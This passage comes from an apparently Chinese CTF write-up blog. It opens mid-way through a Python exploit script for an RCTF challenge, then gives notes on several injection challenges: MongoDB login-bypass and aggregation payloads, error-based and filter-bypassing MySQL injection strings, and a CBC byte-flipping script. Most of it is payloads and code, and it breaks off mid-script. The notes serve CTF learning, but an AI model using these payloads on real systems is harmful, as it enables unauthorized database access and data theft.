class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] captcha: %s"</span> % pow)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># submit post id</span></span><br><span class="line">        <span class="comment"># id=0&amp;captcha=1780076&amp;test=1</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>: post_id,</span><br><span class="line">            <span class="string">'captcha'</span>: break_hash(<span class="string">'md5'</span>, pow),</span><br><span class="line">            <span class="string">'test'</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = req.post(url, data=data)</span><br><span class="line">        print(<span class="string">'[*] sent post to feedback'</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.text.find(<span class="string">'Admin will view your post soon.'</span>) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if all posts were removed or not after 5 seconds</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resp.text.find('Log-in to your account') != -1:</span></span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> resp.text.find(post_id) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># save result and continue to next bit</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> attack(i, j, tries+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s)<span class="number">-7</span>, <span class="number">8</span>):</span><br><span class="line">        v = <span class="string">'0b'</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            v += s[i+j]</span><br><span class="line"></span><br><span class="line">        ret += chr(int(v, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = <span class="string">'md5'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        key = sys.argv[<span class="number">1</span>]</span><br><span class="line">        x = break_hash(cipher, key)</span><br><span class="line">        print(x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        istart = len(s) // <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(istart, <span class="number">400</span>):</span><br><span class="line">            jstart = len(s) % <span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> jstart == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">'0'</span></span><br><span class="line">                jstart += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(jstart, <span class="number">8</span>):</span><br><span class="line">                s += str(attack(i, j))</span><br><span class="line">                print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line">            print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line">        print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>SQL 题型记录</title>
    <url>/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="CyBRICS-CTF-2019-NopeSQL"><a href="#CyBRICS-CTF-2019-NopeSQL" class="headerlink" title="CyBRICS CTF 2019 NopeSQL"></a>CyBRICS CTF 2019 NopeSQL</h2><blockquote>
<p> 这道题考察mongodb注入,学到很多,复现的时候由于不会搭建环境导致都是看着payload和文档来想象解析过程的.很是菜鸡.</p>
</blockquote>
<p>开局的界面,看起来那个是登录用的框框,下面的新闻估计是随机生成的不知道啥意思.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634032-fd035e00-acc2-11e9-8eaf-a6ff3a9fb412.png" alt="image"></p>
<p>首先发现<code>.git</code>源码泄露,如下所示:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($user == <span class="keyword">true</span>): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href=<span class="string">"?filter=$category"</span>&gt;category&lt;/a&gt; | </span><br><span class="line">        &lt;a href=<span class="string">"?filter=$public"</span>&gt;publicity&lt;/a&gt;&lt;br&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline = [</span><br><span class="line">            [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">            [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">            [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $filters = [</span><br><span class="line">            [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line">	</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">            <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                    printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])): <span class="meta">?&gt;</span></span><br><span class="line">        Invalid username <span class="keyword">or</span> password</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">'/'</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;News&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line">        $cursor = $collection-&gt;find([<span class="string">'public'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $news) &#123;</span><br><span class="line">            printf(<span class="string">"%s&lt;br&gt;"</span>, $news[<span class="string">'title'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看出来这是一个mongodb的注入题目,问题分为两个部分,首先是登录,这个好办,比赛的时候是构造下面的载荷来登录的(现在回头一看好多冗余.比赛的时候脑子不开窍啊……orz)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=&quot;,&quot;username&quot;:&#123;&quot;any&quot;:&quot;</span><br><span class="line">password=&quot;&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:&quot;dd&quot;&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>

<p>看一看大佬的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名：随便</span><br><span class="line">密码：&quot;,&quot;password&quot;:&#123;&quot;$ne&quot;: null&#125;,&quot;username&quot;:&quot;admin</span><br></pre></td></tr></table></figure>

<p>然后界面就是这样的了:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634710-7b143480-acc4-11e9-8a71-2458db059585.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634735-89fae700-acc4-11e9-930c-0c990671b453.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61634744-91ba8b80-acc4-11e9-88ff-60e14a675ad0.png" alt="image"></p>
<p>看起来这里是分别根据类型和是否公开两个标准来呈现新闻条目的统计情况的.而且开局界面的那些新闻都筛选出来的公开的新闻,根据源码也可以看出filter是注入点(毕竟不会无缘无故给你一个功能的嘛).</p>
<p>然后不会mongodb…..赛后看payload如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12</span><br></pre></td></tr></table></figure>

<p>分析一下</p>
<p>这里的结构解析出来到代码中就类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;project&quot;]=&gt; array(1) &#123; </span><br><span class="line">    [&quot;category&quot;]=&gt; array(1) &#123;</span><br><span class="line">	[&quot;$cond&quot;]=&gt; array(3) &#123;</span><br><span class="line">	    [&quot;if&quot;]=&gt; array(1) &#123;</span><br><span class="line">		[&quot;$eq&quot;]=&gt; array(2) &#123;</span><br><span class="line">		    [0]=&gt; array(1) &#123; [&quot;$strLenBytes&quot;]=&gt; string(6) &quot;$title&quot; &#125; </span><br><span class="line">		    [1]=&gt; array(1) &#123; [&quot;$toInt&quot;]=&gt; string(2) &quot;19&quot; &#125; </span><br><span class="line">		&#125; </span><br><span class="line">	    &#125; </span><br><span class="line">	    [&quot;then&quot;]=&gt; string(5) &quot;$text&quot; </span><br><span class="line">	    [&quot;else&quot;]=&gt; string(2) &quot;12&quot; </span><br><span class="line">	&#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合代码来看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pipeline = [</span><br><span class="line">    [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],</span><br><span class="line">    [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],</span><br><span class="line">    [&apos;$limit&apos; =&gt; 5],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$filters = [</span><br><span class="line">    [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>我们经过$cond筛选后得到的category会被当做_id并在下文中呈现出来.$eq $cond $strLenBytes $toInt 这些都是mongodb中的全局变量或者是数据库中的字段名,全局变量起到的是函数的作用,这段payload的意思就是首先对$title进行统计长度($strLenBytes),然后对数字19(是flag所在条目的title长度,可以一个一个数字去爆破)进行取整($toInt),最后比较他们两者是否相等($eq),如果相等,就将这个条目的$text内容赋值给category,否则,就赋值12.</p>
<p>这里有一点需要注意,mongodb中每个expression都必须被一对花括号括起来(json格式),这也解释了为什么payload中有一个空的中括号了<code>[]</code></p>
<p>参考链接:</p>
<p><a href="https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline" target="_blank" rel="noopener">https://impakho.com/post/cybrics-ctf-2019-writeup?from=timeline</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/toInt/</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/cond/index.html</a></p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/aggregation/eq/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/reference/operator/aggregation/eq/</a></p>
<h2 id="websec-level-4"><a href="#websec-level-4" class="headerlink" title="websec level 4"></a>websec level 4</h2><p>the database uses <code>sqlite3</code> instead of <code>mysql</code> ;</p>
<p>Given source codes as follow (leftmost two scripts)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58558693-12748280-8254-11e9-8acb-ba824cb791cd.png" alt="image"></p>
<p>And from the source code , we can recognize the exist of <code>unserialize exploit</code> , so the payload is listed on the buttom, which is generated by the php script on the right.</p>
<blockquote>
<p>In sqlite3 , you can show column_name by “select sql from sqlite_master where tbl_name=’table_name’ and type=’table’ “</p>
</blockquote>
<p>by replacing the query ‘s content to “select password as username from users”, we got a flag</p>
<h2 id="ichunqiu-百度杯Vld"><a href="#ichunqiu-百度杯Vld" class="headerlink" title="ichunqiu 百度杯Vld"></a>ichunqiu 百度杯Vld</h2><p>关键代码<code>login.php</code> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'dbmysql.class.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    $db = <span class="keyword">new</span> mysql_db();</span><br><span class="line">    <span class="comment">//所谓safedata其实就是addslash</span></span><br><span class="line">    $username = $db-&gt;safe_data($_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = $db-&gt;my_md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line">    $number = is_numeric($_POST[<span class="string">'number'</span>]) ? $_POST[<span class="string">'number'</span>] : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意这个诡异的替换，如果我们传入%00和一个单引号，在addslash之后会有\0\'，然后经过这个函数的替换之后成为\\'，可以实现逃逸。</span></span><br><span class="line">    $username = trim(str_replace($number, <span class="string">''</span>, $username));</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from"</span>.<span class="string">"`"</span>.table_name.<span class="string">"`"</span>.<span class="string">"where username="</span>.<span class="string">"'"</span>.<span class="string">"$username"</span>.<span class="string">"'"</span>;</span><br><span class="line">    $row = $db-&gt;query($sql);</span><br><span class="line">    $result = $db-&gt;fetch_array($row);</span><br><span class="line">    <span class="keyword">if</span>($row)&#123;</span><br><span class="line">        <span class="keyword">if</span>($result[<span class="string">"number"</span>] === $number &amp;&amp; $result[<span class="string">"password"</span>] === $password)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('nothing here!')&lt;/script&gt;"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('密码错误，老司机翻车了!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">            &lt;/script&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(mysql_error());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;</span></span><br><span class="line"><span class="string">            alert('用户名密码不能为空!');</span></span><br><span class="line"><span class="string">            function jumpurl()&#123;</span></span><br><span class="line"><span class="string">                location='login.html';</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            setTimeout('jumpurl()',1000);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),database())x from information_schema.tables group by x )a) ;%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select table_name from information_schema.tables where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select column_name from information_schema.columns where table_schema=database() limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select flag from ctf.flag limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ps:group_concat 可能遇到未知问题</p>
</blockquote>
<p>updatexml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and updatexml(1,(select mid(concat(1,group_concat(flag)),1,64) from ctf.flag),1)%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>

<p>报错位数有限，偏移一下就可以了。</p>
<p>注意：group_concat 之前不加东西可能读不全，如下</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57983217-e271f600-7a81-11e9-9dd5-d087a09c7716.png" alt="image"></p>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>通过异或符号来检测有哪些符号被过滤了.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos;</span><br><span class="line">1&quot;</span><br><span class="line">1&apos;--+</span><br><span class="line">1&quot;--+</span><br><span class="line">1&apos;^(0)--+</span><br><span class="line">1&apos;^(1)--+</span><br><span class="line">1&apos;^(length(&apos;select&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;union&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;or&apos;)&gt;0)--+</span><br><span class="line">.........</span><br><span class="line">-1&apos; uniunionon selselectect 1,2 --+</span><br><span class="line">-1&apos; uniunionon selselectect 1,database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag1&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;hint&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(flag1,&quot; :: &quot;,address) from flag1--+</span><br></pre></td></tr></table></figure>

<p>and we get the second address</p>
<h2 id="ichunqiu-SQL"><a href="#ichunqiu-SQL" class="headerlink" title="ichunqiu SQL"></a>ichunqiu SQL</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.ichunqiu.com/battalion?q=2619</span><br><span class="line">https://www.ichunqiu.com/writeup/detail/1845</span><br></pre></td></tr></table></figure>

<p>关于为什么不需要闭合的原因，因为是id，id是int类型的，默认情况下就是where id=(数字)，因此不需要闭合，除非有额外处理，都是要试出来的</p>
<blockquote>
<p>小插入：在mysql5.7 以上版本中，select from users limit 1 union select from (select 1)a join (select 2)b join (select 3)c;已经不能使用了；<br>取而代之的是：(select from users limit 1) union (select from (select 1)a join (select 2)b join (select 3)c);</p>
</blockquote>
<h2 id="shiyan-club-login-background"><a href="#shiyan-club-login-background" class="headerlink" title="shiyan-club login background"></a>shiyan-club login background</h2><p>we can detect that many keywords are filtered,like ‘union’, ‘=’(so use ‘regexp’),’substr’,’mid’,and so on.</p>
<p>based on exp-error</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema regexp database())a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(colunm_name) from informaion_schema.columns where table_name regexp &apos;ffll44jj&apos;)a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(value) from ff1144jj)a))) or &apos;</span><br></pre></td></tr></table></figure>

<p>based on xml-error</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmlupdate and extractvalue</span><br><span class="line"></span><br><span class="line">username=1&apos; or/*&amp;password=&apos;*/extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*this require did not work</span><br><span class="line"></span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*but the responce is &quot;SELECT command denied to user &apos;web8&apos;@&apos;localhost&apos; for table &apos;tables&apos;&quot;</span><br><span class="line">/*syntax error*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*works but strangly , the first table_name do not show*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())))or&apos;</span><br><span class="line">/*works and show all the table_name*/</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1)or&apos;</span><br><span class="line">/*works ,same problem happend when delete &apos;0x7e&apos;*/</span><br></pre></td></tr></table></figure>

<h2 id="shiyanbar-登陆一下好吗？"><a href="#shiyanbar-登陆一下好吗？" class="headerlink" title="shiyanbar 登陆一下好吗？"></a>shiyanbar 登陆一下好吗？</h2><p>payload1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:&apos;=&apos;</span><br><span class="line">password:&apos;=&apos;</span><br><span class="line">语句为：select flag from xxx where username=&apos;&apos;=&apos;&apos; and password=&apos;&apos;=&apos;&apos;;</span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username:b&apos;+0;%00</span><br><span class="line">username 在burpsuite中改，%00在burpsuite中是%2500,变成%00,其他不变就可以了</span><br><span class="line">password:1</span><br><span class="line"># 语句为：select flag from xxx where username=&apos;a&apos;+0;%00&apos;and password=&apos;1&apos;;</span><br></pre></td></tr></table></figure>

<h2 id="cbc-字节翻转攻击注入"><a href="#cbc-字节翻转攻击注入" class="headerlink" title="cbc 字节翻转攻击注入"></a>cbc 字节翻转攻击注入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def denglu(payload,idx,c1,c2):</span><br><span class="line">    url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">    payload = &#123;&apos;id&apos;: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    iv=re.findall(r&quot;iv=(.*?),&quot;, Set_Cookie)[0]</span><br><span class="line">    cipher=re.findall(r&quot;cipher=(.*)&quot;, Set_Cookie)[0]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=&apos;&apos;.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;&apos;iv&apos;: iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;, cont)[0]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">    iv_new=&apos;&apos;</span><br><span class="line">    for i in range(16):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;&apos;iv&apos;: iv_new, &apos;cipher&apos;: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    print rcont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">denglu(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span 